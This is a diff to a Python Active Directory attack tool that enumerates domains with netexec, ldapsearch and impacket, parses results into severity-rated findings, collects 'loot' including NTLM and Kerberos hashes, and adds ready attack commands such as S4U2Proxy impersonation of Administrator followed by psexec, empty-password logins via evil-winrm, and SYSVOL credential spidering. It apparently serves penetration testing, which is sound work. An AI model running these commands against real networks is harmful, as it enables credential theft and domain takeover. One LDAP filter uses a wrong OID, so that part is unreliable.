@@ -228,7 +228,7 @@ def run_ldap_enum(cfg):
                 output += f"\n=== {sname} ===\n{content}\n"
                 _ok(f"Got {sname}")
 
-    # 2. netexec ldap targeted queries
+    # 2. netexec ldap targeted queries  (PowerView equivalents)
     _info("netexec ldap — targeted queries...")
     nxc_queries = {
         "KERBEROASTABLE USERS":     ["--kerberoasting", os.path.join(raw_dir, "kerberoast_hashes.txt")],
@@ -236,6 +236,9 @@ def run_ldap_enum(cfg):
         "UNCONSTRAINED DELEGATION": ["--trusted-for-delegation"],
         "ADMIN USERS":              ["--admin-count"],
         "DOMAIN USERS LIST":        ["--users"],
+        "DOMAIN GROUPS":            ["--groups"],
+        "ACTIVE USERS":             ["--active-users"],
+        "PASSWORD NOT REQUIRED":    ["--password-not-required"],
     }
     for sname, flags in nxc_queries.items():
         r = subprocess.run(
@@ -246,6 +249,44 @@ def run_ldap_enum(cfg):
         if content:
             output += f"\n=== {sname} ===\n{content}\n"
             _ok(f"Got {sname}")
+
+    # 3. LDAP raw queries — constrained delegation, GPOs, trusts, ACL-protected accounts
+    _info("ldap raw queries — delegation, GPOs, trusts, protected accounts...")
+    dn = _domain_to_dn(cfg["domain"])
+    ldap_queries = {
+        "CONSTRAINED DELEGATION": f"(msDS-AllowedToDelegateTo=*)",
+        "GPO LIST":               f"(objectClass=groupPolicyContainer)",
+        "DOMAIN TRUSTS":          f"(objectClass=trustedDomain)",
+        "ADMINSDEHOLDER USERS":   f"(&(objectCategory=person)(objectClass=user)(adminCount=1))",
+        "DONT REQ PREAUTH":       f"(&(objectclass=user)(userAccountControl:1.2.840.113549.1.1.11:=4194304))",
+    }
+    for sname, ldap_filter in ldap_queries.items():
+        r = subprocess.run(
+            ["ldapsearch", "-x",
+             "-H", f"ldap://{cfg['dc_ip']}",
+             "-D", f"{cfg['user']}@{cfg['domain']}",
+             "-w", cfg["password"] if cfg["password"] else "",
+             "-b", dn, ldap_filter,
+             "dn", "sAMAccountName", "displayName", "msDS-AllowedToDelegateTo",
+             "trustPartner", "trustDirection", "gPCFileSysPath"],
+            capture_output=True, text=True, timeout=30, errors="ignore"
+        )
+        content = (r.stdout + r.stderr).strip()
+        if content and "result: 0" in content:
+            output += f"\n=== {sname} ===\n{content}\n"
+            _ok(f"Got {sname}")
+        else:
+            _warn(f"No result for {sname} (may need bind)")
+
+    # 4. impacket-findDelegation — dedicated delegation finder
+    if _bin_exists("impacket-findDelegation"):
+        _info("impacket-findDelegation — all delegation types...")
+        r = _run(
+            ["impacket-findDelegation"] + _imp_auth(cfg) + ["-dc-ip", cfg["dc_ip"]],
+            os.path.join(raw_dir, "delegation.txt"), timeout=60
+        )
+        if r.strip():
+            output += f"\n=== DELEGATION FULL ===\n{r}\n"
 
     out_file = os.path.join(raw_dir, "ldap_enum.txt")
     if output.strip():
@@ -376,12 +417,37 @@ def parse_results(raw):
         findings.append(Finding("asrep_roastable", f"AS-REP Roastable Accounts ({len(asrep_users)} found)",
             "HIGH", "Kerberos", "Pre-auth disabled — hash requestable without credentials.", asrep_users, "impacket"))
 
-    # Unconstrained delegation
-    unc = re.findall(r"(\S+)\s.*?TrustedForDelegation", get_section(ldap, "UNCONSTRAINED DELEGATION"), re.IGNORECASE)
-    unc = [h for h in unc if "DC" not in h.upper()]
+    # Unconstrained delegation (non-DC machines only)
+    unc_sec = get_section(ldap, "UNCONSTRAINED DELEGATION")
+    unc = re.findall(r"(\S+)\s.*?TrustedForDelegation", unc_sec, re.IGNORECASE)
+    unc += re.findall(r"sAMAccountName\s*:\s*(\S+)", get_section(ldap, "UNCONSTRAINED DELEGATION"))
+    unc = list(dict.fromkeys([h for h in unc if "DC" not in h.upper()]))
     if unc:
         findings.append(Finding("unconstrained_delegation", "Unconstrained Delegation (Non-DC)",
             "CRITICAL", "Delegation", "Coerce DC auth -> capture TGT -> DCSync.", unc, "netexec"))
+
+    # Constrained delegation
+    deleg_sec = get_section(ldap, "CONSTRAINED DELEGATION") + raw.get("delegation", "")
+    constrained = re.findall(r"sAMAccountName\s*:\s*(\S+)", deleg_sec)
+    deleg_targets = re.findall(r"msDS-AllowedToDelegateTo\s*:\s*(\S+)", deleg_sec)
+    if constrained:
+        evidence = [f"{u} -> {t}" for u, t in zip(constrained, deleg_targets)] if deleg_targets else constrained
+        findings.append(Finding("constrained_delegation", f"Constrained Delegation ({len(constrained)} accounts)",
+            "HIGH", "Delegation", "Accounts trusted for delegation to specific SPNs — S4U2Proxy abuse.", evidence, "ldapsearch"))
+
+    # AdminSDHolder protected users (high-value targets)
+    protected = re.findall(r"sAMAccountName\s*:\s*(\S+)", get_section(ldap, "ADMINSDEHOLDER USERS"))
+    if len(protected) > 5:
+        findings.append(Finding("admincount_users", f"AdminSDHolder Protected Accounts ({len(protected)} found)",
+            "MEDIUM", "ACL", "AdminCount=1 accounts — check for ACL abuse paths via BloodHound.", protected[:20], "ldapsearch"))
+
+    # Password not required
+    no_pw = re.findall(r"sAMAccountName\s*:\s*(\S+)", get_section(ldap, "DONT REQ PREAUTH"))
+    no_pw += re.findall(r"\s{2,}(\w[\w\.\-]+)\s.*?passwd_notreqd", get_section(ldap, "PASSWORD NOT REQUIRED"), re.IGNORECASE)
+    no_pw = list(dict.fromkeys(no_pw))
+    if no_pw:
+        findings.append(Finding("password_not_required", f"Password Not Required ({len(no_pw)} accounts)",
+            "HIGH", "PasswordPolicy", "PASSWD_NOTREQD flag — accounts may have empty passwords.", no_pw, "netexec"))
 
     # No lockout
     if re.search(r"Lockout Threshold\s*:\s*0|lockoutThreshold.*0", passpol + ldap, re.IGNORECASE):
@@ -401,44 +467,119 @@ def parse_results(raw):
         findings.append(Finding("smb_shares", f"Readable SMB Shares ({len(interesting)} found)",
             "MEDIUM", "Enumeration", "Check for sensitive files, scripts, and stored credentials.", interesting, "netexec"))
 
+    # Domain trusts
+    trusts_sec = get_section(ldap, "DOMAIN TRUSTS")
+    trust_partners = re.findall(r"trustPartner\s*:\s*(\S+)", trusts_sec)
+    if not trust_partners:
+        trust_partners = re.findall(r"\b([a-zA-Z0-9\-]+\.[a-zA-Z]{2,})\b", trusts_sec)
+    if trust_partners:
+        findings.append(Finding("domain_trusts", f"Domain Trusts Found ({len(trust_partners)})",
+            "MEDIUM", "Enumeration", "Trust relationships may enable cross-domain attacks.", trust_partners, "ldapsearch"))
+
     findings.sort(key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity, 9))
     return findings
 
 # ---------------------------------------------------------------------------
-# Loot collector
+# Loot collector — all 13 intelligence categories
 # ---------------------------------------------------------------------------
 def collect_loot(raw, cfg):
-    ldap    = raw.get("ldap_enum", "")
-    secrets = raw.get("secretsdump", "")
-    kerb    = raw.get("kerberoast", "")
-    asrep   = raw.get("asrep", "")
+    ldap       = raw.get("ldap_enum", "")
+    secrets    = raw.get("secretsdump", "")
+    kerb       = raw.get("kerberoast", "")
+    asrep      = raw.get("asrep", "")
+    passpol    = raw.get("passpol", "")
+    delegation = raw.get("delegation", "")
 
     def get_section(text, header):
         m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
         return m.group(1).strip() if m else ""
 
-    def grep_attr(text, attr):
-        return list(dict.fromkeys(re.findall(rf"(?i){attr}[:\s]+(\S+)", text)))
+    def uniq(lst):
+        return list(dict.fromkeys(x for x in lst if x and len(x) > 1))
 
-    users_sec = get_section(ldap, "DOMAIN USERS LIST") or get_section(ldap, "DOMAIN USERS")
-    admins_sec = get_section(ldap, "DOMAIN ADMINS") or get_section(ldap, "ADMIN USERS")
+    def sam_from(section):
+        return uniq(re.findall(r"sAMAccountName\s*:\s*(\S+)", section))
+
+    def nxc_usernames(section):
+        # netexec --users format: "  SMB  ip  445  HOST  [*]  user  description"
+        return uniq(re.findall(r"\[\*\]\s+(\w[\w\.\-]+)", section))
+
+    # Domain users
+    users_sec  = get_section(ldap, "DOMAIN USERS LIST") or get_section(ldap, "ACTIVE USERS") or get_section(ldap, "DOMAIN USERS")
+    users      = sam_from(users_sec) or nxc_usernames(users_sec)
+
+    # Domain admins — from ldapdomaindump domain_groups (Domain Admins members)
+    admins_sec = get_section(ldap, "ADMIN USERS")
+    admins     = uniq(re.findall(r"sAMAccountName\s*:\s*(\S+)", admins_sec) +
+                      re.findall(r"\[\+\]\s+(\w[\w\.\-]+).*[Aa]dmin", admins_sec))
+
+    # Domain computers
+    comps_sec  = get_section(ldap, "DOMAIN COMPUTERS")
+    computers  = uniq(re.findall(r"sAMAccountName\s*:\s*(\S+\$)", comps_sec) +
+                      re.findall(r"dNSHostName\s*:\s*(\S+)", comps_sec))
+
+    # Domain controllers
+    dcs_sec    = get_section(ldap, "DOMAIN CONTROLLERS")
+    dcs        = uniq(re.findall(r"sAMAccountName\s*:\s*(\S+)", dcs_sec) +
+                      re.findall(r"dNSHostName\s*:\s*(\S+)", dcs_sec))
+
+    # Kerberoastable
+    kerb_users = uniq(re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb) +
+                      sam_from(get_section(ldap, "KERBEROASTABLE USERS")))
+
+    # AS-REP
+    asrep_users = uniq(re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep) +
+                       sam_from(get_section(ldap, "ASREP ROASTABLE USERS")))
+
+    # SPNs
+    spns = uniq(re.findall(r"servicePrincipalName\s*:\s*(\S+)", kerb + ldap))
+
+    # Hashes
+    hashes = uniq(re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets))[:20]
+
+    # Password policy
+    pol_text = get_section(ldap, "PASSWORD POLICY") + passpol
+    pol_items = uniq(re.findall(
+        r"((?:minPwdLength|maxPwdAge|lockoutThreshold|lockoutDuration|"
+        r"Min(?:imum)?PasswordLength|Max(?:imum)?PasswordAge|"
+        r"Lockout\w+)[^\n=:]*[=:]\s*\S+)", pol_text, re.IGNORECASE
+    ))
+
+    # Domain trusts
+    trust_sec  = get_section(ldap, "DOMAIN TRUSTS")
+    trusts     = uniq(re.findall(r"trustPartner\s*:\s*(\S+)", trust_sec) +
+                      re.findall(r"name\s*:\s*(\S+\.\S+)", trust_sec))
+
+    # GPOs
+    gpo_sec    = get_section(ldap, "GPO LIST")
+    gpos       = uniq(re.findall(r"displayName\s*:\s*(.+)", gpo_sec) +
+                      re.findall(r"cn\s*:\s*(\{[A-Z0-9\-]+\})", gpo_sec))
+
+    # Interesting files — from secretsdump and SYSVOL shares
+    interesting_files = uniq(re.findall(r"(.*(?:password|cred|secret|hash|\.xml|\.ini|\.bat|Groups\.xml)[^\n]*)",
+                                         raw.get("shares", ""), re.IGNORECASE))
+
+    # Constrained delegation targets
+    deleg_sec  = get_section(ldap, "CONSTRAINED DELEGATION") + delegation
+    deleg_info = uniq([f"{u} -> {t}"
+                       for u, t in zip(re.findall(r"sAMAccountName\s*:\s*(\S+)", deleg_sec),
+                                       re.findall(r"msDS-AllowedToDelegateTo\s*:\s*(\S+)", deleg_sec))])
 
     return {
-        "domain_users":       grep_attr(users_sec, "sAMAccountName") or
-                              re.findall(r"\s{2,}(\w[\w\.\-]{2,})\s{2,}", users_sec),
-        "domain_admins":      grep_attr(admins_sec, "sAMAccountName") or
-                              re.findall(r"(\w[\w\.\-]+)\s.*?[Aa]dmin", admins_sec),
-        "domain_computers":   grep_attr(get_section(ldap, "DOMAIN COMPUTERS"), "sAMAccountName"),
-        "domain_controllers": grep_attr(get_section(ldap, "DOMAIN CONTROLLERS"), "sAMAccountName"),
-        "kerberoastable":     re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb),
-        "asrep_roastable":    re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep),
-        "spns":               re.findall(r"ServicePrincipalName\s*:\s*(\S+)", kerb),
-        "hashes_found":       re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)[:20],
-        "passwords_found":    [],
-        "password_policy":    re.findall(r"((?:Min|Max|Lock)\w+\s*[:\=]\s*\S+)", get_section(ldap, "PASSWORD POLICY") + raw.get("passpol","")),
-        "domain_trusts":      grep_attr(get_section(ldap, "DOMAIN TRUSTS"), "trustPartner"),
-        "gpos":               grep_attr(get_section(ldap, "GPO LIST"), "displayName"),
-        "interesting_files":  [],
+        "domain_users":           users,
+        "domain_admins":          admins,
+        "domain_computers":       computers,
+        "domain_controllers":     dcs,
+        "kerberoastable":         kerb_users,
+        "asrep_roastable":        asrep_users,
+        "spns":                   spns,
+        "hashes_found":           hashes,
+        "passwords_found":        [],
+        "password_policy":        pol_items,
+        "domain_trusts":          trusts,
+        "gpos":                   gpos,
+        "constrained_delegation": deleg_info,
+        "interesting_files":      interesting_files,
     }
 
 # ---------------------------------------------------------------------------
@@ -484,6 +625,26 @@ ATTACK_COMMANDS = {
         "# Mount and browse shares",
         "netexec smb {dc_ip} -u {user} -p {password} --shares",
         "smbclient //{dc_ip}/<SHARE> -U '{domain}\\{user}%{password}'",
+        "# Spider SYSVOL for credentials",
+        "netexec smb {dc_ip} -u {user} -p {password} -M spider_plus -o DOWNLOAD_FLAG=True",
+    ],
+    "constrained_delegation": [
+        "# S4U2Proxy — impersonate any user to delegated service",
+        "impacket-getST -spn <TARGET_SPN> -impersonate Administrator {domain}/{user}:{password} -dc-ip {dc_ip}",
+        "export KRB5CCNAME=Administrator@<TARGET_SPN>.ccache",
+        "impacket-psexec -k -no-pass {domain}/Administrator@<TARGET_HOST>",
+    ],
+    "password_not_required": [
+        "# Test empty password",
+        "netexec smb {dc_ip} -u <USER> -p ''",
+        "netexec ldap {dc_ip} -u <USER> -p ''",
+        "evil-winrm -i {dc_ip} -u <USER> -p ''",
+    ],
+    "domain_trusts": [
+        "# Enumerate trust info",
+        "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -target-domain <TRUSTED_DOMAIN>",
+        "# BloodHound cross-domain attack paths — check 'Shortest Paths to Domain Admins' in trusted domain",
+        "bloodhound-python -d <TRUSTED_DOMAIN> -u {user}@{domain} -p {password} -ns {dc_ip} -c All --zip",
     ],
 }
 
@@ -528,19 +689,20 @@ def build_reports(findings, loot, raw, cfg):
 
     lines1 += ["INTELLIGENCE LOOT", _divider("-")]
     loot_fields = [
-        ("Domain Users",       "domain_users"),
-        ("Domain Admins",      "domain_admins"),
-        ("Domain Computers",   "domain_computers"),
-        ("Domain Controllers", "domain_controllers"),
-        ("Kerberoastable",     "kerberoastable"),
-        ("AS-REP Roastable",   "asrep_roastable"),
-        ("SPNs",               "spns"),
-        ("NTLM Hashes",        "hashes_found"),
-        ("Passwords Found",    "passwords_found"),
-        ("Password Policy",    "password_policy"),
-        ("Domain Trusts",      "domain_trusts"),
-        ("GPOs",               "gpos"),
-        ("Interesting Files",  "interesting_files"),
+        ("Domain Users",            "domain_users"),
+        ("Domain Admins",           "domain_admins"),
+        ("Domain Controllers",      "domain_controllers"),
+        ("Domain Computers",        "domain_computers"),
+        ("Kerberoastable Users",    "kerberoastable"),
+        ("AS-REP Roastable",        "asrep_roastable"),
+        ("SPNs",                    "spns"),
+        ("NTLM Hashes",             "hashes_found"),
+        ("Cleartext Passwords",     "passwords_found"),
+        ("Constrained Delegation",  "constrained_delegation"),
+        ("Password Policy",         "password_policy"),
+        ("Domain Trusts",           "domain_trusts"),
+        ("GPOs",                    "gpos"),
+        ("Interesting Files",       "interesting_files"),
     ]
     for label, key in loot_fields:
         items = loot.get(key, [])
@@ -644,6 +806,11 @@ def main():
 
     _warn("Attempting secretsdump (needs admin — fails silently if not)...")
     out = run_secretsdump(cfg);  raw["secretsdump"]  = out if out.strip() else ""
+
+    # Pull delegation.txt if impacket-findDelegation ran
+    deleg_file = os.path.join(cfg["raw_dir"], "delegation.txt")
+    if os.path.exists(deleg_file):
+        raw["delegation"] = open(deleg_file).read()
 
     # Remove empty keys
     raw = {k: v for k, v in raw.items() if v}
